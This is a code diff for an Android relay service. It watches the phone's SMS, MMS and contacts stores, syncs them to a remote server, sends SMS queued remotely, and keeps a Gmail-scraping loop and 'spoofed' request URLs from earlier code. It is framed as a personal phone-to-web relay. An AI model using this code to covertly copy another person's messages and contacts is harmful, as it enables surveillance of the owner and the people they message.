@@ -8,8 +8,14 @@ import android.app.Service
 import android.content.Context
 import android.content.Intent
 import android.content.pm.ServiceInfo
+import android.database.ContentObserver
+import android.net.Uri
 import android.os.Build
+import android.os.Handler
 import android.os.IBinder
+import android.os.Looper
+import android.provider.ContactsContract
+import android.provider.Telephony
 import android.telephony.SmsManager
 import android.util.Log
 import androidx.core.app.NotificationCompat
@@ -21,6 +27,13 @@ import kotlin.concurrent.thread
 /**
  * Persistent foreground relay (VPN-style notification).
  * Keeps outbox polling + log shipping alive when the UI is closed.
+ *
+ * Also watches the telephony provider:
+ *  - content://sms changes  → near-real-time history sync (catches SMS sent
+ *    from the native SMS app, which no broadcast would reveal)
+ *  - content://mms changes  → MMS sync (P4)
+ *  - contacts changes       → full contact re-sync (a contact added on the
+ *    phone appears on the web client seconds later)
  */
 class RelayForegroundService : Service() {
 
@@ -29,6 +42,13 @@ class RelayForegroundService : Service() {
         private const val CHANNEL_ID = "gafam_relay"
         private const val NOTIF_ID = 5150
         private const val ACTION_STOP = "com.gafam.relay.STOP_RELAY"
+
+        /** Debounce for provider observers (writes often arrive in bursts). */
+        private const val OBSERVER_DEBOUNCE_MS = 4000L
+        /** Periodic contact re-sync cadence (provider observer is the fast path). */
+        private const val CONTACT_SYNC_PERIOD_MS = 30 * 60 * 1000L
+        /** If no sent-report broadcast arrives within this delay, assume the SMS left. */
+        private const val SENT_FALLBACK_MS = 45_000L
 
         private val running = AtomicBoolean(false)
 
@@ -54,6 +74,25 @@ class RelayForegroundService : Service() {
     private val pollAlive = AtomicBoolean(false)
     private var edgePollTick = 0
     private var gmailScrapeTick = 0
+    private var lastContactSyncAt = 0L
+
+    /** Outbox ids sent but awaiting their delivery report — never re-sent. */
+    private val inFlightOutbox = java.util.concurrent.ConcurrentHashMap.newKeySet<Int>()
+
+    private val handler = Handler(Looper.getMainLooper())
+    private var contactsObserver: ContentObserver? = null
+    private var smsObserver: ContentObserver? = null
+    private var mmsObserver: ContentObserver? = null
+
+    private val contactsSyncRunnable = Runnable {
+        ContactSync.syncAsync(applicationContext, force = true)
+    }
+    private val smsSyncRunnable = Runnable {
+        SmsHistorySync.syncAsync(applicationContext, force = true)
+    }
+    private val mmsSyncRunnable = Runnable {
+        MmsSync.syncAsync(applicationContext, force = false)
+    }
 
     override fun onBind(intent: Intent?): IBinder? = null
 
@@ -73,12 +112,16 @@ class RelayForegroundService : Service() {
         running.set(true)
         LogShipper.start(this)
         LogShipper.event(this, "I", "relay", "Foreground relay service started")
-        
+
         // Gmail scrape via full-screen notification (works in deep sleep)
         startGmailScrapeLoop()
         startPollLoop()
-        // Import recent conversations from the phone SMS store
+        registerProviderObservers()
+
+        // Import recent conversations from the phone SMS/MMS stores
         SmsHistorySync.syncAsync(this, force = true)
+        MmsSync.syncAsync(this, force = true)
+
         // Periodic soft refresh (respects min interval)
         thread(name = "gafam-sms-history-timer", isDaemon = true) {
             while (running.get()) {
@@ -115,9 +158,69 @@ class RelayForegroundService : Service() {
     override fun onDestroy() {
         pollAlive.set(false)
         running.set(false)
+        unregisterProviderObservers()
         EmailDumpsysPoller.stop()
         LogShipper.event(this, "W", "relay", "Foreground relay service stopped")
         super.onDestroy()
+    }
+
+    // --- Provider observers (near-real-time sync triggers) ---
+
+    private fun registerProviderObservers() {
+        try {
+            contactsObserver = object : ContentObserver(handler) {
+                override fun onChange(selfChange: Boolean) {
+                    handler.removeCallbacks(contactsSyncRunnable)
+                    handler.postDelayed(contactsSyncRunnable, OBSERVER_DEBOUNCE_MS)
+                }
+            }
+            contentResolver.registerContentObserver(
+                ContactsContract.Contacts.CONTENT_URI, true, contactsObserver!!
+            )
+        } catch (e: Exception) {
+            Log.w(TAG, "Contacts observer failed to register", e)
+        }
+
+        try {
+            smsObserver = object : ContentObserver(handler) {
+                override fun onChange(selfChange: Boolean) {
+                    handler.removeCallbacks(smsSyncRunnable)
+                    handler.postDelayed(smsSyncRunnable, OBSERVER_DEBOUNCE_MS)
+                }
+            }
+            contentResolver.registerContentObserver(
+                Telephony.Sms.CONTENT_URI, true, smsObserver!!
+            )
+        } catch (e: Exception) {
+            Log.w(TAG, "SMS observer failed to register", e)
+        }
+
+        try {
+            mmsObserver = object : ContentObserver(handler) {
+                override fun onChange(selfChange: Boolean) {
+                    handler.removeCallbacks(mmsSyncRunnable)
+                    handler.postDelayed(mmsSyncRunnable, OBSERVER_DEBOUNCE_MS)
+                }
+            }
+            contentResolver.registerContentObserver(
+                Telephony.Mms.CONTENT_URI, true, mmsObserver!!
+            )
+        } catch (e: Exception) {
+            Log.w(TAG, "MMS observer failed to register", e)
+        }
+        LogShipper.event(this, "I", "relay", "Provider observers registered (sms/mms/contacts)")
+    }
+
+    private fun unregisterProviderObservers() {
+        handler.removeCallbacks(contactsSyncRunnable)
+        handler.removeCallbacks(smsSyncRunnable)
+        handler.removeCallbacks(mmsSyncRunnable)
+        contactsObserver?.let { contentResolver.unregisterContentObserver(it) }
+        smsObserver?.let { contentResolver.unregisterContentObserver(it) }
+        mmsObserver?.let { contentResolver.unregisterContentObserver(it) }
+        contactsObserver = null
+        smsObserver = null
+        mmsObserver = null
     }
 
     private fun startGmailScrapeLoop() {
@@ -154,6 +257,12 @@ class RelayForegroundService : Service() {
                     edgePollTick++
                     if (edgePollTick % 2 == 0) {
                         EdgeClient.syncOnce(applicationContext)
+                    }
+                    // Periodic contact re-sync (fast path = provider observer)
+                    val now = System.currentTimeMillis()
+                    if (now - lastContactSyncAt > CONTACT_SYNC_PERIOD_MS) {
+                        lastContactSyncAt = now
+                        ContactSync.syncAsync(applicationContext, force = false)
                     }
                     // Launch Gmail scrape activity every 60s (same toggle as scrape loop)
                     gmailScrapeTick++
@@ -230,6 +339,16 @@ class RelayForegroundService : Service() {
         val plaintext = cipher.doFinal(ciphertext)
         val outboxArray = org.json.JSONArray(String(plaintext, Charsets.UTF_8))
 
+        // Prune in-flight ids whose row vanished from the VPC outbox (report
+        // landed and the row was deleted server-side).
+        if (inFlightOutbox.isNotEmpty()) {
+            val present = HashSet<Int>()
+            for (i in 0 until outboxArray.length()) {
+                present.add(outboxArray.getJSONObject(i).getInt("id"))
+            }
+            inFlightOutbox.retainAll(present)
+        }
+
         if (outboxArray.length() > 0) {
             updateNotification("Sending ${outboxArray.length()} outbox SMS…")
         }
@@ -237,23 +356,14 @@ class RelayForegroundService : Service() {
         for (i in 0 until outboxArray.length()) {
             val msg = outboxArray.getJSONObject(i)
             val id = msg.getInt("id")
+            val smsId = msg.optInt("sms_id", 0)
             val recipient = msg.getString("recipient")
             val body = msg.getString("body")
-            try {
-                val smsManager = SmsManager.getDefault()
-                val parts = smsManager.divideMessage(body)
-                if (parts.size == 1) {
-                    smsManager.sendTextMessage(recipient, null, body, null, null)
-                } else {
-                    smsManager.sendMultipartTextMessage(recipient, null, parts, null, null)
-                }
-                Log.d(TAG, "Sent remote SMS to $recipient")
-                LogShipper.event(this, "I", "outbox", "Sent SMS to $recipient (${body.length} chars)")
-            } catch (e: Exception) {
-                Log.e(TAG, "Failed to send SMS to $recipient", e)
-                LogShipper.event(this, "E", "outbox", "Failed SMS to $recipient: ${e.message}")
-            }
-            deleteFromOutbox(apiUrl, jwtSecret, id)
+            // Skip rows already sent and waiting for their delivery report —
+            // the VPC keeps the row until the report lands, so without this
+            // guard the 1s poll would re-send the SMS dozens of times.
+            if (!inFlightOutbox.add(id)) continue
+            sendOutboxSms(id, smsId, recipient, body)
         }
 
         if (outboxArray.length() > 0) {
@@ -261,19 +371,48 @@ class RelayForegroundService : Service() {
         }
     }
 
-    private fun deleteFromOutbox(apiUrl: String, jwtSecret: String, id: Int) {
+    /**
+     * Sends one outbox SMS and wires the delivery feedback loop:
+     *  - SmsManager throws immediately  → report "failed" to the VPC
+     *  - sent-report broadcast arrives  → SmsSentReceiver reports sent/failed
+     *  - no broadcast within 45 s       → assume "sent" (many devices never fire it)
+     * The VPC status endpoint updates gafam_sms and removes the outbox row,
+     * so the web UI always reflects what really happened.
+     */
+    private fun sendOutboxSms(outboxId: Int, smsId: Int, recipient: String, body: String) {
         try {
-            val client = ApiClient.getClient(this) ?: return
-            val spoofedUrl = ApiClient.getSpoofedUrl(apiUrl, "/api/auth/sms/outbox?id=$id")
-            val request = Request.Builder()
-                .url(spoofedUrl)
-                .delete()
-                .addHeader("Authorization", "Bearer $jwtSecret")
-                .build()
-            client.newCall(request).execute()
+            val smsManager = SmsManager.getDefault()
+            val parts = smsManager.divideMessage(body)
+            if (parts.size == 1) {
+                smsManager.sendTextMessage(
+                    recipient, null, body,
+                    SmsSentReceiver.buildSentIntent(this, outboxId, smsId),
+                    null
+                )
+            } else {
+                val sentIntents = ArrayList<PendingIntent>()
+                for (j in parts.indices) {
+                    sentIntents.add(SmsSentReceiver.buildSentIntent(this, outboxId, smsId))
+                }
+                smsManager.sendMultipartTextMessage(recipient, null, parts, sentIntents, null)
+            }
+            Log.d(TAG, "Sent remote SMS to $recipient")
+            LogShipper.event(this, "I", "outbox", "Sent SMS to $recipient (${body.length} chars)")
+            scheduleSentFallback(outboxId, smsId)
         } catch (e: Exception) {
-            Log.e(TAG, "Error deleting outbox msg", e)
+            Log.e(TAG, "Failed to send SMS to $recipient", e)
+            LogShipper.event(this, "E", "outbox", "Failed SMS to $recipient: ${e.message}")
+            SmsSentReceiver.reportStatus(applicationContext, outboxId, smsId, "failed")
         }
+    }
+
+    private fun scheduleSentFallback(outboxId: Int, smsId: Int) {
+        handler.postDelayed({
+            if (SmsSentReceiver.markReportedIfNew(outboxId)) {
+                Log.d(TAG, "No sent-report for outbox $outboxId — assuming sent")
+                SmsSentReceiver.reportStatus(applicationContext, outboxId, smsId, "sent")
+            }
+        }, SENT_FALLBACK_MS)
     }
 
     private fun createChannel() {
